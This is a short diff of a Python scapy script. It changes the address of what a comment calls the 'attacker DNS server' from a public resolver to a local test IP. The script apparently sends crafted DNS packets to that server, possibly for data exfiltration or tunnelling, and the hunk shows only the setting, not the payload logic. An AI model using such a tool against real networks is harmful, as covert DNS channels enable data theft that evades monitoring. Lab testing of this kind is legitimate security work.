@@ -7,7 +7,7 @@ from scapy.all import DNS, DNSQR, IP, UDP, send
 
 # IP of attacker DNS server
 # Change this IP to your local IP if you want to test it on the local network.
-dst_ip = "8.8.8.8" 
+dst_ip = "10.0.0.2" 
 
 if os.name == "nt":
     windows = True
